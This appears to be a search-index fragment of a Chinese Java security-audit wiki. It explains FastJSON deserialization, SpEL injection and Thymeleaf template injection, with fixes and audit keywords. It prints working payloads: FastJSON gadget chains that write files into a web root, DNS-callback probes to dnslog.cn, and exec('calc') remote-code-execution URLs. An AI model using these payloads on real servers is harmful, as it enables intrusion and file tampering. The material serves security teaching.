\u7136\u540e\u5224\u65adclazz\u662f\u5426\u662fexceptClass\u7684\u5b50\u7c7b\uff0c\u662f\u7684\u8bdd\u5c31\u76f4\u63a5\u8fd4\u56de\u7c7b\u5bf9\u8c61\u3002\u7c7b\u5bf9\u8c61\u88ab\u8fd4\u56de\u540e\uff0c\u5c31\u4f1a\u8fdb\u5165\u88ab\u53cd\u5e8f\u5217\u5316\u7684\u4e0b\u4e00\u4e2a\u8fc7\u7a0b\uff0c\u5b83\u7684\u6784\u9020\u65b9\u6cd5\u7b49\u4f1a\u88ab\u8c03\u7528\uff0c\u4ece\u800c\u5b8c\u6210\u5229\u7528\u3002","title":"\u8c03\u8bd5"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#gadget","text":"\u5b9e\u6218\u4e2d\u7528\u7684payload: \u6587\u4ef6\u79fb\u52a8\uff1a\u5c06\u4e00\u4e2a\u6587\u4ef6\u4e2d\u7684\u5185\u5bb9\u79fb\u52a8\u5230\u65b0\u7684\u4e00\u4e2a\u6587\u4ef6\u4e2d\u53bb\uff0c\u539f\u6765\u6587\u4ef6\u7684\u5185\u5bb9\u6d88\u5931\u3002 <dependency> <groupId>org.aspectj</groupId> <artifactId>aspectjtools</artifactId> <version>1.9.5</version></dependency> {\"@type\":\"java.lang.AutoCloseable\", \"@type\":\"org.eclipse.core.internal.localstore.SafeFileOutputStream\", \"tempPath\":\"D:/b.txt\", \"targetPath\":\"E:/b.txt\"} \u6587\u4ef6\u5199\u5165 <dependency> <groupId>com.sleepycat</groupId> <artifactId>je</artifactId> <version>5.0.73</version> </dependency> <dependency> <groupId>com.esotericsoftware</groupId> <artifactId>kryo</artifactId> <version>4.0.0</version> </dependency> <dependency> <groupId>org.aspectj</groupId> <artifactId>aspectjtools</artifactId> <version>1.9.5</version> </dependency> { \"stream\": { \"@type\": \"java.lang.AutoCloseable\", \"@type\": \"org.eclipse.core.internal.localstore.SafeFileOutputStream\", \"targetPath\": \"D:/wamp64/www/hacked.txt\", \\\\\u521b\u5efa\u4e00\u4e2a\u7a7a\u6587\u4ef6 \"tempPath\": \"D:/wamp64/www/test.txt\"\\\\\u521b\u5efa\u4e00\u4e2a\u6709\u5185\u5bb9\u7684\u6587\u4ef6 }, \"writer\": { \"@type\": \"java.lang.AutoCloseable\", \"@type\": \"com.esotericsoftware.kryo.io.Output\", \"buffer\": \"cHduZWQ=\", \\\\base64\u540e\u7684\u6587\u4ef6\u5185\u5bb9 \"outputStream\": { \"$ref\": \"$.stream\" }, \"position\": 5 }, \"close\": { \"@type\": \"java.lang.AutoCloseable\", \"@type\": \"com.sleepycat.bind.serial.SerialOutput\", \"out\": { \"$ref\": \"$.writer\" } } }","title":"\u5b9e\u6218Gadget"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_9","text":"","title":"\u6f0f\u6d1e\u68c0\u6d4b"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#dnslog","text":"{\"@type\":\"java.net.InetAddress\",\"val\":\"dnslog.cn\"} \u572849\u4ee5\u4e0b\u624d\u80fd\u89e6\u53d1\uff0c\u56e0\u4e3a\u8fd9\u4e2agadget\u572849\u88ab\u7981\u6b62\u4e86\uff0c\u53ef\u7528\u4e8e\u68c0\u6d4b\u5177\u4f53\u7248\u672c {\"@type\":\"java.net.Inet4Address\",\"val\":\"dnslog\"} {\"@type\":\"java.net.Inet6Address\",\"val\":\"dnslog\"} {\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"dnslog\"}} {\"@type\":\"com.alibaba.fastjson.JSONObject\", {\"@type\": \"java.net.URL\", \"val\":\"dnslog\"}}\"\"} {{\"@type\":\"java.net.URL\",\"val\":\"dnslog\"}:\"aaa\"} Set[{\"@type\":\"java.net.URL\",\"val\":\"dnslog\"}] Set[{\"@type\":\"java.net.URL\",\"val\":\"dnslog\"} {{\"@type\":\"java.net.URL\",\"val\":\"dnslog\"}:0","title":"DNSLOG"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_10","text":"\u8fd0\u6c14\u597d\u53ef\u4ee5\u76f4\u63a5\u51fa\u7248\u672c\u53f7 {\"xxx\":\"\\x+(eyJhIjoiXHgaGiJ9\u7684base64\u89e3\u7801) \u572860\u4ee5\u4e0b\u624d\u80fd\u89e6\u53d1\uff0c\u5f53\u540e\u7aef Fastjson \u7248\u672c\u5c0f\u4e8e 1.2.60 \u65f6\uff0c\u4f7f\u7528\u8be5\u8bf7\u6c42\u5305\u4e0d\u4f1a\u5ef6\u65f6\u4e0d\u4f1a\u62a5\u9519\uff0c\u53cd\u4e4b\u5219\u4f1a\u5ef6\u8fdf\u6216\u62a5\u9519","title":"\u62a5\u9519\u68c0\u6d4b"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_11","text":"\u6709\u4e9b\u5f00\u53d1\u4eba\u5458\u5728\u5199\u89e3\u6790JSON\u7684\u76f8\u5173\u4ee3\u7801\u65f6\uff0c\u53ef\u80fd\u4f1a\u8bbe\u7f6e\u53ea\u80fd\u4f20\u5165\u6307\u5b9a\u5bf9\u8c61\u3002 \u800c\u6211\u4eec\u901a\u8fc7\u8bbe\u7f6e@type\u65f6\u4f20\u5165\u7684\u5bf9\u8c61\u53ef\u80fd\u4f1a\u4e0e\u6307\u5b9a\u5bf9\u8c61\u4e0d\u5339\u914d\u4ece\u800c\u53d1\u751ftype not match\u7684\u5f02\u5e38\u3002 \u89e3\u51b3\u529e\u6cd5\u662f\u8fd9\u6837,\u6700\u5916\u5c42\u5957\u5c42\u5bf9\u8c61 { \"xxx\": {\"@type\":\"java.net.InetAddress\",\"val\":\"dnslog\"} }","title":"\u7ed5\u8fc7\u5f02\u5e38"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_12","text":"JSON.parseObject(","title":"\u5ba1\u8ba1\u5173\u952e\u5b57"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%E6%B5%85%E6%9E%90FastJSON%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#_13","text":"https://c014.cn/pdfs/java/Fastjson/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E.html https://www.freebuf.com/vuls/228099.html https://aluvion.gitee.io/2020/08/23/Fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%BA%E5%88%B6%E5%92%8Cautotype%E8%A7%82%E6%B5%8B/#1-2-25-lt-Fastjson-lt-1-2-41-checkAutoType-%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87 https://paper.seebug.org/1192/#1225 https://www.mi1k7ea.com/2019/11/11/Fastjson%E7%B3%BB%E5%88%97%E5%9B%9B%E2%80%94%E2%80%941-2-25-1-2-47%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88%E6%97%A0%E9%9C%80%E5%BC%80%E5%90%AFAutoType%EF%BC%89/#%E4%B8%8D%E5%8F%97AutoTypeSupport%E5%BD%B1%E5%93%8D%E7%9A%84%E7%89%88%E6%9C%AC https://www.mi1k7ea.com/2021/02/08/Fastjson%E7%B3%BB%E5%88%97%E5%85%AD%E2%80%94%E2%80%941-2-48-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#0x04-1-2-68%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88expectClass%E7%BB%95%E8%BF%87AutoType%EF%BC%89","title":"\u53c2\u8003"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/","text":"\u8868\u8fbe\u5f0f\u6ce8\u5165 Spel\u8868\u8fbe\u5f0f\u6ce8\u5165&\u76f8\u5173\u7ec4\u4ef6\u7684Spel\u8868\u8fbe\u5f0f\u6ce8\u5165\u5206\u6790 ognl \u6ce8\u5165","title":"\u8868\u8fbe\u5f0f\u6ce8\u5165"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/#_1","text":"Spel\u8868\u8fbe\u5f0f\u6ce8\u5165&\u76f8\u5173\u7ec4\u4ef6\u7684Spel\u8868\u8fbe\u5f0f\u6ce8\u5165\u5206\u6790 ognl \u6ce8\u5165","title":"\u8868\u8fbe\u5f0f\u6ce8\u5165"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E5%AE%A1%E8%AE%A1%E6%8A%80%E5%B7%A7/%E6%9C%89%E6%9C%BA%E5%8F%AF%E4%B9%98%E7%9A%84%E7%BB%84%E4%BB%B6/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%26%E7%9B%B8%E5%85%B3%E7%BB%84%E4%BB%B6%E7%9A%84Spel%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E5%88%86%E6%9E%90/","text":"Spel\u8868\u8fbe\u5f0f\u6ce8\u5165&\u76f8\u5173\u7ec4\u4ef6\u7684Spel\u8868\u8fbe\u5f0f\u6ce8\u5165\u5206\u6790 \u76ee\u5f55 Spel\u8868\u8fbe\u5f0f\u6ce8\u5165 \u73af\u5883\u642d\u5efa \u6f0f\u6d1e\u539f\u7406 \u5ba1\u8ba1\u5173\u952e\u5b57 \u4fee\u590d Thymeleadf \u6a21\u677f\u6ce8\u5165\uff08\u57fa\u4e8eSpel\u8868\u8fbe\u5f0f\u6ce8\u5165\uff09 \u7b80\u4ecb Thymeleaf\u8fd0\u884c\u903b\u8f91 redirect: HttpServletResponse \u9632\u5fa1 ResponseBody RestController Thymeleaf \u6a21\u677f\u6ce8\u5165 Spel\u8868\u8fbe\u5f0f\u6ce8\u5165 Spel\u8868\u8fbe\u5f0f\u662fspring\u4e0b\u7684\u4e00\u79cd\u8868\u8fbe\u5f0f\u8bed\u8a00\uff0c\u82e5\u76ee\u6807\u7a0b\u5e8fSpel\u8868\u8fbe\u5f0f\u53ef\u63a7\u4e14\u80fd\u88ab\u89e3\u6790\uff0c\u5219\u53ef\u80fd\u4f1a\u5bfc\u81f4RCE\u7b49\u5b89\u5168\u95ee\u9898\u3002 \u73af\u5883\u642d\u5efa \u8d77\u4e00\u4e2a\u9879\u76ee\uff0c\u7136\u540e\u5bfc\u5165maven\u5373\u53ef <properties> <org.springframework.version>5.0.8.RELEASE</org.springframework.version> </properties> <dependency> <groupId>org.springframework</groupId> <artifactId>spring-expression</artifactId> <version>${org.springframework.version}</version> </dependency> \u6f0f\u6d1e\u539f\u7406 \u6211\u4eec\u6765\u770b\u4e00\u6bb5\u6709\u6f0f\u6d1e\u7684\u4ee3\u7801\uff0c\u5047\u8bbeexpression2 \u53d8\u91cf\u7528\u6237\u53ef\u63a7 ExpressionParser parser = new SpelExpressionParser(); String expression2 = \"T(java.lang.Runtime).getRuntime().exec('calc')\"; //\u5047\u8bbeexpression2 \u53d8\u91cf\u7528\u6237\u53ef\u63a7\uff0c\u8fd9\u4e2a\u53d8\u91cf\u7684\u5185\u5bb9\u4fbf\u662fspel\u8868\u8fbe\u5f0f //\u4e5f\u53ef\u4ee5\u7528new\u5173\u952e\u5b57 String expression2 = \"new ProcessBuilder('calc').start()\"; Expression result2 = parser.parseExpression(expression2); result2.getValue(); \u7528\u6237\u4f20\u5165\u6076\u610fspel\u8868\u8fbe\u5f0f\u540e\uff0c\u5728\u7b2c\u4e09\u884cparseExpression\u65b9\u6cd5\u88ab\u89e3\u6790\uff0c\u7b2c\u56db\u884c\u5728getValue\u65b9\u6cd5\u88ab\u6267\u884cspel\u8868\u8fbe\u5f0f\u5185\u5bb9\uff0c\u5b8c\u6210RCE \u7528\u6237\u4f20\u5165\u7684Spel\u8868\u8fbe\u5f0f\u4e2d\uff0c T(java.lang.Runtime)\u7528\u4e8e\u5b9e\u4f8b\u5316\u67d0\u4e2a\u7c7b\uff0c\u5b9e\u4f8b\u5316\u540e\u6211\u4eec\u53ef\u4ee5\u8c03\u7528\u5176\u5185\u90e8\u65b9\u6cd5\u3002\u4e5f\u53ef\u4ee5\u7528new\u5173\u952e\u5b57\uff0c\u5c31\u50cf\u6ce8\u91ca\u4e2d\u7684\u4e00\u884c \u6709\u4e9b\u65f6\u5019\u4f1a\u5bf9spel\u8fdb\u884c\u9274\u522b\uff0c\u5373\u6ee1\u8db3\u4e00\u5b9a\u6761\u4ef6\u7684\u5b57\u7b26\u4e32\u624d\u4f1a\u88ab\u8ba4\u4e3a\u662f\u8868\u8fbe\u5f0f\uff0c\u6bd4\u5982\u8fd9\u6837 ExpressionParser parser = new SpelExpressionParser(); ParserContext parserContext = new ParserContext() { @Override public boolean isTemplate() { return true; } @Override public String getExpressionPrefix() { return \"#{\"; } @Override public String getExpressionSuffix() { return \"}\"; } }; String template = \"#{'hello '}#{'freebuf!'}\"; Expression expression = parser.parseExpression(template, parserContext); System.out.println(expression.getValue()); \u901a\u8fc7getExpressionPrefix\u548cgetExpressionPrefix\u65b9\u6cd5\uff0c\u786e\u5b9a\u5728 #{..} \u4e2d\u7684\u5b57\u7b26\u4e32\u624d\u4e3aSPEL\u8868\u8fbe\u5f0f \u5ba1\u8ba1\u5173\u952e\u5b57 org.springframework.expression.spel.standard getValue() parseExpression() \u4fee\u590d SimpleEvaluationContext\u2009\u548cStandardEvaluationContext\u2009 StandardEvaluationContext\u2009 \u662f\u9ed8\u8ba4\u7684\u4e0a\u4e0b\u6587\u73af\u5883\uff0c\u5bf9spel\u89e3\u6790\u4e0d\u8bbe\u9650\u5236 SimpleEvaluationContext\u2009 \u662f\u53d7\u9650\u7684\u4e0a\u4e0b\u6587\u73af\u5883\uff0c\u4e0d\u5141\u8bb8spel\u6267\u884c\u6784\u9020\u65b9\u6cd5\uff0cjava\u7c7b\u578b\u5f15\u7528\uff0cbean\u7c7b\u578b\u5f15\u7528 \u4fee\u590d\u540e\u4ee3\u7801 ExpressionParser parser = new SpelExpressionParser(); String expression2 = \"new ProcessBuilder('calc').start()\"; Expression result2 = parser.parseExpression(expression2); EvaluationContext context = SimpleEvaluationContext.forReadOnlyDataBinding().build(); result2.getValue(context); \u8fd0\u884c\u7ed3\u679c ref: https://www.freebuf.com/articles/network/250026.html \u4f7f\u7528\u5982\u4e0b\u9879\u76ee\u642d\u5efa\u73af\u5883\uff0cidea\u6253\u5f00\u5176pom.xml\u5373\u53ef https://github.com/veracode-research/spring-view-manipulation/ Thymeleadf \u6a21\u677f\u6ce8\u5165\uff08\u57fa\u4e8eSpel\u8868\u8fbe\u5f0f\u6ce8\u5165\uff09 \u7b80\u4ecb Thymeleaf\u662f\u4e00\u4e2a\u670d\u52a1\u7aef\u6a21\u677f\u5f15\u64ce\uff0cspring\u5b98\u65b9\u652f\u6301\u8be5\u5f15\u64ce\u3002 Thymeleaf\u8fd0\u884c\u903b\u8f91 \u6765\u5230\u9879\u76ee\u4e2d\u7684HelloControleer \u7b2c16\u884c @GetMapping(\"/\") public String index(Model model) { model.addAttribute(\"message\", \"happy birthday\"); return \"welcome\"; } \u8fd9\u91cc\u4ee3\u7801\u903b\u8f91\u662fspring\u7684\uff0c\u63a5\u6536\u6240\u6709url\u4e3a / \u7684\u8bf7\u6c42\u5230\u6b64\u63a7\u5236\u5668\u8fdb\u884c\u5904\u7406\u3002 \u7136\u540e\u5411model\u6dfb\u52a0\u952e\u503c\u5bf9\uff0cmodel\u4e2d\u7684\u6570\u636e\u4f1a\u968f\u7740\u8981\u8fd4\u56de\u7684\u89c6\u56fe\u4e00\u8d77\u8fd4\u56de\u7ed9\u524d\u7aef\uff0c\u6b64\u5904\u952e\u4e3amessage\uff0c\u503c\u4e3ahappy birthday \u7136\u540ereturn\u4e00\u884c\u8fd4\u56de\u4e86 /templates/welcome.html \u8fd9\u4e2a\u89c6\u56fe \uff08\u76f8\u5f53\u4e8e\u7ed9welcome\u6dfb\u52a0\u524d\u7f00templates/ \uff0c\u540e\u7f00.html) \u6211\u4eec\u6765\u770b\u770bwelcome.html <!DOCTYPE HTML> <html lang=\"en\" xmlns:th=\"http://www.thymeleaf.org\"> <div th:fragment=\"header\"> <h3>Spring Boot Web Thymeleaf Example</h3> </div> <div th:fragment=\"main\"> <span th:text=\"'Hello, ' + ${message}\"></span> </div> </html> \u6211\u4eec\u770b\u5012\u6570\u7b2c\u4e09\u884cth:text \u5185\u90e8\u6709 ${message} ,${...}\u91cc\u9762\u5c31\u662fSPEL\u8868\u8fbe\u5f0f\u6216\u8005ognl\u8868\u8fbe\u5f0f \u53e6\u5916\uff0c\u5982\u679c\u8fd4\u56de\u6a21\u677f\u65f6return\u7684\u5185\u5bb9\u4e2d\u542b\u6709 :: \uff0c\u5219\u8be5\u5b57\u7b26\u4e32\u4f1a\u88ab\u5f53\u4f5c\u8868\u8fbe\u5f0f\u5904\u7406 \u540c\u65f6\u5728\u8868\u8fbe\u5f0f\u4e2d\u8fd8\u6709 \\${..} \u8fd9\u79cd\u9884\u5904\u7406\u8868\u8fbe\u5f0f\uff0c\u5728\u5176\u4e2d\u7684\u5185\u5bb9\u4f1a\u66f4\u4f18\u5148\u5904\u7406\u4e00\u6b21\uff08\u9884\u5904\u7406\uff09 \u5c31\u50cf\u8fd9\u79cd\u4ee3\u7801 @GetMapping(\"/path\") public String path(@RequestParam String lang) { return \"user/\" + lang + \"/welcome\"; //template path is tainted } \u6ce8\u610f\u8fd9\u91cc\u7684payload\u6211\u5e76\u6ca1\u6709\u7528\u5230\u9884\u5904\u7406\u8868\u8fbe\u5f0f\uff0c\u56e0\u4e3asection\u4e2d\u53c2\u6570\u672c\u6765\u5c31\u662fselector\u7684\u5185\u5bb9\uff0c\u672c\u6765\u5c31\u4f1a\u88ab\u89e3\u6790\uff0c\u6ca1\u5fc5\u8981\u518d\u5957\u4e00\u5c42\u9884\u5904\u7406\u3002 \u6ce8\u610f\u8fd9\u91cc\u7684payload\u4e5f\u8981\u52a0\u4e0a\\${..} \u90a3\u4e48\u8fd9\u4e32\u4ee3\u7801\u5462\uff1f @GetMapping(\"/doc/{document}\") public void getDocument(@PathVariable String document) { log.info(\"Retrieving \" + document); //returns void, so view name is taken from URI } \u548c\u4e0a\u9762\u7684\u601d\u8def\u4e00\u6837\uff0c\u4f46\u662fpayload\u9700\u8981\u5fae\u5fae\u8c03\u6574\u4e00\u4e0b http://127.0.0.1:8090/doc/__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"calc\").getInputStream()).next()}__::.x \u81f3\u4e8e\u4e3a\u4ec0\u4e48templatename\u5fc5\u987b\u88ab__${} \u5305\u56f4\uff0c\u662f\u56e0\u4e3a\u5b9e\u9645\u4e0a\u7684templatename\u4e3a/doc/xxxxxx \u6211\u4eec\u53ef\u63a7\u7684\u662f\u7b2c\u4e8c\u5c42\u8def\u7531\uff0c\u4e3a\u4e86\u4fdd\u8bc1\u7b2c\u4e8c\u5c42\u8def\u7531\u91cc\u7684\u8868\u8fbe\u5f0f\u80fd\u591f\u987a\u5229\u88ab\u6267\u884c\u800c\u4e0d\u53d7\u524d\u9762\u7684 /doc/ \u5e72\u6270\u547d\u4ee4\uff0c\u6240\u4ee5\u7528 ${}__\u9884\u5904\u7406\u4e00\u4e0b \u81f3\u4e8e\u4e3a\u4ec0\u4e48selecor\u524d\u9762\u8981\u6709\u4e00\u4e2a . \u539f\u56e0\u662f\u8fd9\u6837\u7684 \u6a21\u677f\u540d\u83b7\u53d6\u5b9e\u9645\u4e0a\u662f\u901a\u8fc7\u8fd9\u4e2a\u51fd\u6570\u62ff\u5230\u7684 \u5b83\u4f1a\u5bf9url\u83b7\u5f97\u7684\u6a21\u677f\u540d\u8fdb\u884c\u4fee\u6b63\uff0c\u6bd4\u5982\u589e\u52a0\u524d\u7f00\u540e\u7f00\uff08\u9ed8\u8ba4\u4e3a\u7a7a\uff09\uff0c\u4ee5\u53ca\u8c03\u7528\u65b9\u6cd5transformPath\u5904\u7406 \u6211\u4eec\u8ddf\u8fdb\u6b64\u65b9\u6cd5\u5e76\u6ce8\u610f\u65ad\u70b9\u6253\u5230\u7684\u5730\u65b9 this.stripExtension\u5728\u8fd9\u79cd\u60c5\u51b5\u9ed8\u8ba4\u4e3atrue\uff0c\u4e5f\u5c31\u662f\u8bf4\u4f1a\u8c03\u7528StringUtils.stripFilenameExtension\u6765\u5904\u7406\u6211\u4eec\u7684\u6a21\u677f\u540d StringUtils.stripFilenameExtension \u4f1a\u641c\u7d22\u5b57\u7b26\u4e32\u4e2d\u6700\u540e\u4e00\u4e2a . \u7b26\u53f7\u7684\u7d22\u5f15\u4f4d\u7f6e\uff0c\u5e76\u622a\u53d6 . \u4e4b\u524d\u7684\u5185\u5bb9\u8fd4\u56de\u3002 \u6240\u4ee5\u5982\u679c\u6211\u4eec\u7684payload selector\u4e0d\u52a0 . \u90a3\u4e48\u622a\u53d6\u540e\u7684\u8868\u8fbe\u5f0f\u4f1a\u53d8\u6210\u8fd9\u6837\uff0c\u6ca1\u6709\u4e86 :: \uff0c\u65e0\u6cd5\u6b63\u786e\u88ab\u5f53\u4f5c\u8868\u8fbe\u5f0f\u89e3\u6790 \u4f46\u5982\u679c\u52a0\u4e86 . ,\u90a3\u4e48\u88ab\u622a\u53d6\u540e\u8868\u8fbe\u5f0f\u4f1a\u53d8\u6210\u8fd9\u6837\uff0c :: \u8fd8\u5728\uff0c\u80fd\u88ab\u5f53\u4f5c\u8868\u8fbe\u5f0f\u89e3\u6790 \u5f04\u61c2\u539f\u7406\u540e\u5c31\u4f1a\u53d1\u73b0\u8fd9\u6837\u6784\u9020payload\u4e5f\u53ef\u4ee5 http://127.0.0.1:8090/doc/::__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"calc\").getInputStream()).next()}__.a \u53ea\u8981\u914d\u7f6e\u4e0aResponseBody\u6216RestController\uff0c\u90a3\u4e48\u5c31\u4e0d\u4f1a\u8fdb\u884c\u89c6\u56fe\u89e3\u6790\u76f8\u5173\u5185\u5bb9\uff0c\u800c\u662f\u76f4\u63a5\u8fd4\u56de redirect: @GetMapping(\"/safe/redirect\") public String redirect(@RequestParam String url) { return \"redirect:\" + url; //FP as redirects are not resolved as expressions } \u5728\u8fd4\u56de\u503c\u524d\u52a0\u5b57\u7b26\u4e32redirect: \uff0c\u8868\u793a\u8be5\u89c6\u56fe\u7684\u89e3\u6790\u4e0d\u518d\u7531 Spring ThymeleafView\u6765\u8fdb\u884c\u89e3\u6790\uff0c\u800c\u662f\u7531 RedirectView \u6765\u8fdb\u884c\u89e3\u6790 HttpServletResponse @GetMapping(\"/safe/doc/{document}\") public void getDocument(@PathVariable String document, HttpServletResponse response) { log.info(\"Retrieving \" + document); //FP } \u53ea\u9700\u8981\u5728\u53c2\u6570\u91cc\u52a0\u4e0a HttpServletResponse response\uff0cspring\u5c31\u4e0d\u4f1a\u518d\u5bf9\u89c6\u56fe\u8fdb\u884c\u89e3\u6790\u3002 \u53ea\u5bf9\u8fd9\u79cd\u76f4\u63a5\u4eceurl\u83b7\u53d6\u6a21\u677f\u540d\u7684\u63a7\u5236\u5668\u6709\u6548 \u9632\u5fa1 \u8fd9\u4e2a\u9879\u76ee\u4e5f\u63d0\u4f9b\u4e86\u4e09\u4e2a\u63a7\u5236\u5668\u7684\u4fee\u590d\u7248 ResponseBody RestController @GetMapping(\"/safe/fragment\") @ResponseBody public String safeFragment(@RequestParam String section) { return \"welcome :: \" + section; //FP, as @ResponseBody annotation tells Spring to process the return values as body, instead of view name } \u6ce8\u610ftemplatename\u5fc5\u987b\u88ab \\${} \u5305\u56f4\uff0cselector\u7b2c\u4e00\u4e2a\u5b57\u7b26\u5fc5\u987b\u4e3a . \u5982\u679c\u6211\u4eeclang\u8d4b\u503c\u4e3a \\${4*4} ::123\uff0c\u53ef\u4ee5\u53d1\u73b0\u9884\u5904\u7406\u8868\u8fbe\u5f0f\u91cc\u7684\u5185\u5bb9\u88ab\u89e3\u6790\u4e86\uff0c\u5e76\u4ee5\u62a5\u9519\u7684\u5f62\u5f0f\u8fd4\u56de\uff08\u6ce8\u610fpaylaod\u9700\u8981urlencode\uff09 \u90a3\u4e48\u8fd9\u4e2a :: \u5230\u5e95\u610f\u5473\u7740\u4ec0\u4e48\u5462\uff0c\u6211\u4eec\u4e0a\u9762\u7684payload\u540e\u9762\u4e3a\u4ec0\u4e48\u8fd8\u8981\u8ddf\u7740\u4e00\u4e32\u5b57\u7b26\u5462\uff1f :: \u662f\u7247\u6bb5\u9009\u62e9\u5668\u7684\u5206\u9694\u7b26\uff0c\u5206\u5272templatename\u548cselector\uff0c\u5373templatename::selector\uff0ctemplatename\u548cselector\u90fd\u4f1a\u88ab\u5f53\u4f5c\u8868\u8fbe\u5f0f\u7684\u90e8\u5206\u89e3\u6790\u4e00\u8d77\u89e3\u6790\uff0c\u5373\u5b9e\u9645\u4e0a\u89e3\u6790\u7684\u5185\u5bb9\u662f \\~{templatename::selector} 